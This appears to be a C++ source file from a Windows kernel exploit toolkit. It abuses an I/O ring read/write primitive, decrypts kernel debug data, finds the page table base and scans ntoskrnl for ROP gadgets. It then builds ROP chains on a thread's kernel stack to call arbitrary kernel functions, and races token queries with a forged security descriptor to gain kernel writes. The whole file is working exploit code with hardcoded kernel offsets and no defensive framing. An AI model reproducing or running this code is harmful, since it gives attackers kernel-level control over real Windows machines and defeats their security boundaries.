#include "kernel.h"
#include "win_defs.h"
#include "moduleinfo.h"

#include <Windows.h>
#include <spdlog/spdlog.h>
#include <format>
#include <atomic>
#include <thread>

extern "C" {
#include <ioringapi.h>
#include <ntstatus.h>
}



namespace collat::kernel {
    HANDLE _token_handle = INVALID_HANDLE_VALUE;
    BYTE _token_info[0x8000];
    wchar_t* _test_pointer = nullptr;
    volatile uint64_t* _smash_pointer = nullptr;

    static DWORD m_dwKernelSize = 0;
    static DWORD_PTR m_KernelAddr = NULL;

    static PVOID m_RopAddr_1 = NULL, m_RopAddr_2 = NULL;
    static PVOID m_RopAddr_3 = NULL, m_RopAddr_4 = NULL, m_RopAddr_5 = NULL;

    static uint64_t _debug_block_keys[2] = { 0 };

    std::unique_ptr<collat::ioring> _ioring = 0;

    uint64_t _pagetable_base = 0;

    std::map < std::string, std::tuple<std::string, uint64_t>> _gadgets = {
        {"pop rcx; ret",        {"\x59\xC3", 0}},
        {"pop rdx; ret",        {"\x5A\xC3", 0}},
        {"pop r8; ret",         {"\x41\x58\xC3", 0}},
        {"pop r9; ret",         {"\x41\x59\xC3", 0}},
        {"pop rax; ret",        {"\x58\xC3", 0}},
        {"jmp rax",             {"\xFF\xE0", 0}},
        {"add rsp, 0x48; ret",  {"\x48\x83\xC4\x48\xC3", 0}},
        {"add rsp, 0x68; ret",  {"\x48\x83\xC4\x68\xC3", 0}},
        {"mov [rcx], rax; ret", {"\x48\x89\x01\xC3", 0}},
        {"ret",                 {"\xC3", 0}},
        {"pop rdi; pop rsi; pop rbp; pop rbx; ret", {"\x5F\x5E\x5D\x5B\xC3", 0}},
        {"jmp $",               {"\xEB\xFE", 0}},
        {"add rsp, 0x78; ret",  {"\x48\x83\xc4\x78\xc3", 0}}
    };

    uint64_t get_gadget(std::string name) {
        return std::get<uint64_t>(_gadgets.at(name));
    }

    bool create_ioring() {
        if (_ioring)
            return false;

        _ioring = std::make_unique<collat::ioring>(GINPUT_PIPE_NAME, GOUTPUT_PIPE_NAME);
        if (!_ioring->init_exploit(0x1000)) {
            spdlog::critical("error whilst exploiting ioring, aborting!");
            exit(0x70000004);
        }
    }

    void fetch_debug_block_keys(void* kernelBase) {
        spdlog::debug("fetching debug block keys...");
        _debug_block_keys[0] = _ioring->raw_read<uint64_t>((void*)((uint64_t)kernelBase + 0x2d33b7));
        _debug_block_keys[1] = _ioring->raw_read<uint64_t>((void*)((uint64_t)kernelBase + 0x2d33d0));
        spdlog::debug("debug block key 0: {:x}", _debug_block_keys[0]);
        spdlog::debug("debug block key 1: {:x}", _debug_block_keys[1]);
    }

    uint64_t debug_block_decrypt(uint64_t base, uint64_t value) {
        return _byteswap_uint64(
            base ^ _rotl64(
                _ioring->raw_read<uint64_t>((void*)(value)) ^ _debug_block_keys[0],
                (char)_debug_block_keys[0])
        ) ^ _debug_block_keys[1];
    }

    BOOL match_sig_wild(CHAR* buffer, CHAR* signature, SIZE_T signatureSize) {
        for (SIZE_T i = 0; i < signatureSize; i++) {
            if (signature[i] != '\xff' && buffer[i] != signature[i]) {
                return FALSE;
            }
        }
        return TRUE;
    }


    BOOL match_sig(CHAR* buffer, CHAR* signature, SIZE_T signatureSize) {
        for (SIZE_T i = 0; i < signatureSize; i++) {
            if (buffer[i] != signature[i]) {
                return FALSE;
            }
        }
        return TRUE;
    }


    uint64_t signscan(uint64_t baseAddress, uint64_t size, char* sig, size_t sigSize, bool match_ff) {
        if (baseAddress == NULL || size == 0 || sig == NULL || sigSize == 0)
            return NULL;

        char* buffer = (char*)malloc(size);
        auto ioring = collat::kernel::get_ioring();
        ioring->raw_read_internal((void*)baseAddress, buffer, size);

        for (size_t i = 0; i <= size - sigSize; i++) {
            if (match_ff) {
                if (match_sig_wild(buffer + i, sig, sigSize)) {

                    free(buffer);
                    return baseAddress + i;
                }
            }
            else {
                if (match_sig(buffer + i, sig, sigSize)) {

                    free(buffer);
                    return baseAddress + i;
                }
            }
        }

        free(buffer);

        return 0;
    }

    UINT64 get_pte_address(UINT64 virtualAddress) {
        virtualAddress >>= 9;
        virtualAddress &= 0x7FFFFFFFF8;

        UINT64 pageTableAddress = _pagetable_base;
        return pageTableAddress += virtualAddress;
    }

    MMPTE get_pagetable_entry(UINT64 virtualAddress) {
        UINT64 pteAddr = 0;
        MMPTE pte = { 0 };
        UINT64 pteAddress = get_pte_address(virtualAddress);
        if (pteAddress) {
            pte = _ioring->raw_read<MMPTE>((VOID*)pteAddress);
            //krnl_read(pteAddr, &pte, sizeof(MMPTE));
        }
        return pte;
    }

    bool fetch_pagetable_base() {
        spdlog::debug("grabbing page table base...");

        auto nt = (uint64_t)collat::kmodule::get_base("ntoskrnl.exe");
        uint64_t ntheadersAddress = collat::kernel::debug_block_decrypt(nt, nt + 0x38);

        auto ntheaders = _ioring->raw_read<IMAGE_NT_HEADERS>((void*)ntheadersAddress);


        PIMAGE_SECTION_HEADER sectionTable = (PIMAGE_SECTION_HEADER)malloc(ntheaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
        _ioring->raw_read_internal((void*)(ntheadersAddress + 0x18 + ntheaders.FileHeader.SizeOfOptionalHeader),
            sectionTable,
            ntheaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

        char getPteAddressSignature[] = GET_PTE_ADDRESS_SIGNATURE;

        int NumOfSections = ntheaders.FileHeader.NumberOfSections;
        for (int i = 0; i < NumOfSections; i++) {
            if (sectionTable[i].Characteristics & IMAGE_SCN_MEM_EXECUTE && !(sectionTable[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {
                for (uint64_t page = 0; page < 0x53a000; page += 0x1000) {
                    //uint64_t address = nt + sectionTable[i].VirtualAddress + n;
                    //ioring->raw_read_internal((void*)address, ReadData, 30);

                    _pagetable_base = signscan(nt + sectionTable[i].VirtualAddress + page, 0x1000, getPteAddressSignature, sizeof(getPteAddressSignature), true);
                    if (_pagetable_base) {
                        _pagetable_base = collat::kernel::get_ioring()->raw_read<uint64_t>((void*)(_pagetable_base + 0x13));
                        spdlog::debug("successfully found page table base! (0x{:x})", _pagetable_base);
                        free(sectionTable);
                        return true;
                    }
                }
            }
        }
        free(sectionTable);
        return false;
    }

    bool init_rop() {
        spdlog::debug("scanning for rop gadgets...");

        auto nt = (uint64_t)collat::kmodule::get_base("ntoskrnl.exe");
        uint64_t ntheadersAddress = collat::kernel::debug_block_decrypt(nt, nt + 0x38);

        auto ntheaders = _ioring->raw_read<IMAGE_NT_HEADERS>((void*)ntheadersAddress);

        PIMAGE_SECTION_HEADER sectionTable = (PIMAGE_SECTION_HEADER)malloc(ntheaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
        _ioring->raw_read_internal((void*)(ntheadersAddress + 0x18 + ntheaders.FileHeader.SizeOfOptionalHeader),
            sectionTable,
            ntheaders.FileHeader.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));

        int gadget_cnt = 0;
        int NumOfSections = ntheaders.FileHeader.NumberOfSections;
        for (int i = 0; i < NumOfSections; i++) {
            if (sectionTable[i].Characteristics & IMAGE_SCN_CNT_CODE && !(sectionTable[i].Characteristics & IMAGE_SCN_MEM_DISCARDABLE)) {
                spdlog::debug("found code section @ 0x{:x}, scanning for gadgets!", nt + sectionTable[i].VirtualAddress);
                spdlog::debug("section va: 0x{:x}", sectionTable[i].VirtualAddress);
                spdlog::debug("section virtual size: 0x{:x}", sectionTable[i].Misc.VirtualSize);
                spdlog::debug("section size of raw data: 0x{:x}", sectionTable[i].SizeOfRawData);
                //continue;
                for (int n = 0; n < sectionTable[i].Misc.VirtualSize - 0x1000; n += 0x1000) {
                    //spdlog::debug("0x{:x} ({})", nt + sectionTable[i].VirtualAddress + n, (void*)(nt + sectionTable[i].VirtualAddress + sectionTable[i].Misc.VirtualSize));
                    if (gadget_cnt >= _gadgets.size())
                        goto got_gadgets;

                    uint64_t address = nt + sectionTable[i].VirtualAddress + n;

                    if (!get_pagetable_entry(address).u.Hard.Valid)
                        continue;

                    //ioring->raw_read_internal((void*)address, ReadData, 5);



                    for (auto& gadget : _gadgets) {
                        auto& [gadgetSignature, gadgetAddress] = gadget.second;

                        if (gadgetAddress != 0)
                            continue;

                        uint64_t newGadgetAddress = signscan(nt + sectionTable[i].VirtualAddress + n, 0x1000, (char*)gadgetSignature.c_str(), gadgetSignature.size(), false);

                        if (newGadgetAddress) {
                            gadgetAddress = newGadgetAddress;
                            spdlog::debug("found '{}' @ 0x{:x}", gadget.first, newGadgetAddress);
                            gadget_cnt++;
                            if (gadget_cnt >= _gadgets.size())
                                goto got_gadgets;
                        }
                    }
                }
            }
        }

        if (gadget_cnt < _gadgets.size()) {
            spdlog::critical("failed to get all rop gadgets!");
            free(sectionTable);
            return false;
        }

    got_gadgets:
        spdlog::debug("successfully found all gadgets!");
        free(sectionTable);
        return true;
    }

    void dummy_thread() {
        while (1) {}
    }

    collat::ioring* get_ioring() {
        return _ioring.get();
    }

    void destroy_ioring() {
        if(_ioring)
            return _ioring.reset();
    }

    uint64_t callvec(void* address, std::vector<void*> arguments) {
        spdlog::debug("calling {}", address);
        HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)dummy_thread, nullptr, CREATE_SUSPENDED, nullptr);

        auto ioring = get_ioring();
        auto ullThreadAddress = collat::get_object<uint64_t>(GetCurrentProcessId(), hThread);
        auto ullStackBase = ioring->raw_read<uint64_t>((void*)(ullThreadAddress + 0x38));

        uint64_t ullRetAddress = 0;
        for (int i = 0x8; i < 0x7000; i += 0x8) {
            auto value = ioring->raw_read<uint64_t>((void*)(ullStackBase - i));
            if ((value & 0xfffff00000000000) == 0xfffff00000000000) {
                if (value == (uint64_t)collat::kmodule::get_base("ntoskrnl.exe") + 0x447db6) {
                    ullRetAddress = ullStackBase - i;
                    //spdlog::debug("found KiApcInterrupt @ 0x{:x} - 0x{:x}", ullStackBase, i);
                    break;
                }
            }
        }

        if (ullRetAddress == 0) {
            spdlog::error("failed to execute rop chain, could not KiApcInterrupt in stack");
            return -1;
        }

        uint64_t stackOffset = 0;
        //ioring->raw_write<uint64_t>(ullRetAddress + stackOffset, get_gadget("pop rax; ret"))

        //std::vector<void*> arguments = { (void*)args... };
        size_t argcnt = arguments.size();

        HANDLE hEvent = CreateEvent(nullptr, TRUE, FALSE, TEXT("CallEvent"));

        STACK_PUT(uint64_t, get_gadget("ret"));

        if (argcnt > 0) {
            STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
            STACK_PUT(void*, arguments.at(0));
        }

        if (argcnt > 1) {
            STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
            STACK_PUT(void*, arguments.at(1));
        }

        if (argcnt > 2) {
            STACK_PUT(uint64_t, get_gadget("pop r8; ret"));
            STACK_PUT(void*, arguments.at(2));
        }

        if (argcnt > 3) {
            STACK_PUT(uint64_t, get_gadget("pop r9; ret"));
            STACK_PUT(void*, arguments.at(3));
        }





        // call function
        STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
        STACK_PUT(void*, address);
        STACK_PUT(uint64_t, get_gadget("jmp rax"));

        uint64_t returnValue = 0;
        // get return value;
        STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
        STACK_PUT(uint64_t, (uint64_t)&returnValue);
        STACK_PUT(uint64_t, get_gadget("mov [rcx], rax; ret"));

        // signal event

        STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
        STACK_PUT(uint64_t, (uint64_t)hEvent);
        STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
        STACK_PUT(uint64_t, 0);
        STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
        STACK_PUT(uint64_t, (uint64_t)collat::kmodule::get_export("ntoskrnl.exe", "ZwSetEvent"));
        STACK_PUT(uint64_t, get_gadget("ret"));
        STACK_PUT(uint64_t, get_gadget("jmp rax"));

        if (argcnt > 4) {
            for (int i = 4; i < argcnt; i++) {
                //spdlog::debug("stack arg");
                STACK_PUT(void*, arguments.at(i));
            }
        }
        if (argcnt > 4 && ((argcnt - 4) % 2)) {
            //spdlog::debug("aligning");
            STACK_PUT(uint64_t, get_gadget("ret"));
        }


        // call ZwTerminateThread
        STACK_PUT(uint64_t, get_gadget("pop rcx; ret"));
        STACK_PUT(uint64_t, (uint64_t)hThread);
        STACK_PUT(uint64_t, get_gadget("pop rdx; ret"));
        STACK_PUT(uint64_t, STATUS_SUCCESS);
        STACK_PUT(uint64_t, get_gadget("pop rax; ret"));
        STACK_PUT(uint64_t, (uint64_t)collat::kmodule::get_base("ntoskrnl.exe") + 0x444100);
        STACK_PUT(uint64_t, get_gadget("jmp rax"));

        ResumeThread(hThread);

        WaitForSingleObject(hEvent, INFINITE);
        CloseHandle(hEvent);

        //Sleep(50); // maybe wait for an event to be triggered by ropchain instead?

        return returnValue;
    }

    void setup_sd()
    {
        PBYTE sd_page = (PBYTE)VirtualAlloc((PVOID)0x65000000, 0x100000, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);

        PBYTE psid_system = sd_page;
        psid_system[0] = 0x01;
        psid_system[1] = 0x01;
        psid_system[2] = 0x00;
        psid_system[3] = 0x00;
        psid_system[4] = 0x00;
        psid_system[5] = 0x00;
        psid_system[6] = 0x00;
        psid_system[7] = 0x05;
        psid_system[8] = 0x12;
        psid_system[9] = 0x00;
        psid_system[10] = 0x00;
        psid_system[11] = 0x00;
        psid_system[12] = 0x00;
        psid_system[13] = 0x00;
        psid_system[14] = 0x00;
        psid_system[15] = 0x00;

        PBYTE sacl_ptr = sd_page + 0x100;
        sacl_ptr[0] = 0x02;
        sacl_ptr[1] = 0x00;
        sacl_ptr[2] = 0x20;
        sacl_ptr[3] = 0x00;
        sacl_ptr[4] = 0x01;
        sacl_ptr[5] = 0x00;
        sacl_ptr[6] = 0x00;
        sacl_ptr[7] = 0x00;
        sacl_ptr[8] = 0x11;
        sacl_ptr[9] = 0x00;
        sacl_ptr[10] = 0x14;
        sacl_ptr[11] = 0x00;
        sacl_ptr[12] = 0x02;
        sacl_ptr[13] = 0x00;
        sacl_ptr[14] = 0x00;
        sacl_ptr[15] = 0x00;
        sacl_ptr[16] = 0x01;
        sacl_ptr[17] = 0x01;
        sacl_ptr[18] = 0x00;
        sacl_ptr[19] = 0x00;
        sacl_ptr[20] = 0x00;
        sacl_ptr[21] = 0x00;
        sacl_ptr[22] = 0x00;
        sacl_ptr[23] = 0x10;
        sacl_ptr[24] = 0x00;
        sacl_ptr[25] = 0x10;
        sacl_ptr[26] = 0x00;
        sacl_ptr[27] = 0x00;
        sacl_ptr[28] = 0x00;
        sacl_ptr[29] = 0x00;

        PBYTE dacl_ptr = sd_page + 0x200;
        dacl_ptr[0] = 0x02;
        dacl_ptr[1] = 0x00;
        dacl_ptr[2] = 0x00;
        dacl_ptr[3] = 0x01;
        dacl_ptr[4] = 0x02;
        dacl_ptr[5] = 0x00;
        dacl_ptr[6] = 0x00;
        dacl_ptr[7] = 0x00;
        dacl_ptr[8] = 0x00;
        dacl_ptr[9] = 0x00;
        dacl_ptr[10] = 0x18;
        dacl_ptr[11] = 0x00;
        dacl_ptr[12] = 0xFF;
        dacl_ptr[13] = 0xFF;
        dacl_ptr[14] = 0xFF;
        dacl_ptr[15] = 0xFF;
        dacl_ptr[16] = 0x01;
        dacl_ptr[17] = 0x02;
        dacl_ptr[18] = 0x00;
        dacl_ptr[19] = 0x00;
        dacl_ptr[20] = 0x00;
        dacl_ptr[21] = 0x00;
        dacl_ptr[22] = 0x00;
        dacl_ptr[23] = 0x0F;
        dacl_ptr[24] = 0x02;
        dacl_ptr[25] = 0x00;
        dacl_ptr[26] = 0x00;
        dacl_ptr[27] = 0x00;
        dacl_ptr[28] = 0x01;
        dacl_ptr[29] = 0x00;
        dacl_ptr[30] = 0x00;
        dacl_ptr[31] = 0x00;
        dacl_ptr[32] = 0x00;
        dacl_ptr[33] = 0x00;
        dacl_ptr[34] = 0x14;
        dacl_ptr[35] = 0x00;
        dacl_ptr[36] = 0xFF;
        dacl_ptr[37] = 0xFF;
        dacl_ptr[38] = 0xFF;
        dacl_ptr[39] = 0xFF;
        dacl_ptr[40] = 0x01;
        dacl_ptr[41] = 0x01;
        dacl_ptr[42] = 0x00;
        dacl_ptr[43] = 0x00;
        dacl_ptr[44] = 0x00;
        dacl_ptr[45] = 0x00;
        dacl_ptr[46] = 0x00;
        dacl_ptr[47] = 0x01;
        dacl_ptr[48] = 0x00;
        dacl_ptr[49] = 0x00;
        dacl_ptr[50] = 0x00;
        dacl_ptr[51] = 0x00;

        PISECURITY_DESCRIPTOR sd = (PISECURITY_DESCRIPTOR)0x65007500;
        sd->Revision = 1;
        sd->Sbz1 = 0;
        sd->Control = 0x14;
        sd->Owner = psid_system;
        sd->Group = psid_system;
        sd->Sacl = (PACL)sacl_ptr;
        sd->Dacl = (PACL)dacl_ptr;
    }

	bool init_exploit(uint64_t nt_base) {
		spdlog::info("attempting kernel exploit");

        setup_sd();

        ULONG sd_ptr_offset = 0xC5A48;

		const wchar_t* attributeStringTarget = L"TSA://ProcUnique";

		ULONG bytesRead = 0;

		OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &_token_handle);
		NtQueryInformationToken(_token_handle, TokenAccessInformation, _token_info, sizeof(_token_info), &bytesRead);

		uint64_t pAttrString = 0;
		for (size_t i = 0; i < sizeof(_token_info) - 0x20; i++) {
			if (memcmp(&_token_info[i], attributeStringTarget, 0x20) == 0) {
				pAttrString = reinterpret_cast<uint64_t>(&_token_info[i]);
				break;
			}
		}
		if (!pAttrString) {
			spdlog::error("failed to find attribute string!");
			return false;
		}

		_test_pointer = reinterpret_cast<wchar_t*>(pAttrString);
		for (size_t i = 0; i < sizeof(_token_info) - 0x20; i++) {
			if (memcmp(&_token_info[i], &pAttrString, 8) == 0) {
				_smash_pointer = reinterpret_cast<volatile uint64_t*>(&_token_info[i]);
				break;
			}
		}
		
		if (!_test_pointer) {
			spdlog::error("failed to find pointer to attribute string!");
			return false;
		}

        /*do_write(nt_base + sd_ptr_offset - 0x18);
        do_write(nt_base + sd_ptr_offset - 0x18 - 1);
        do_write(nt_base + sd_ptr_offset - 0x18 - 2);
        do_write(nt_base + sd_ptr_offset - 0x18 - 3);*/

		spdlog::info("exploit primed!");

		return true;
	}

	void smash_thread(uint64_t address) {
		SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);

		while (1) {
			*_smash_pointer = address;
		}
	}

	void do_write(uint64_t address) {
		ULONG bytesRead;

		std::thread smashThread(smash_thread, address);
		smashThread.detach();

		for (size_t i = 0; i < SMASH_TIMEOUT; i++) {
			*_test_pointer = 0;
			NtQueryInformationToken(_token_handle, TokenAccessInformation, _token_info, sizeof(_token_info), &bytesRead);
			if (*_test_pointer == 0) {
				break;
			}
		}

		TerminateThread(smashThread.native_handle(), 0);
	}

	
}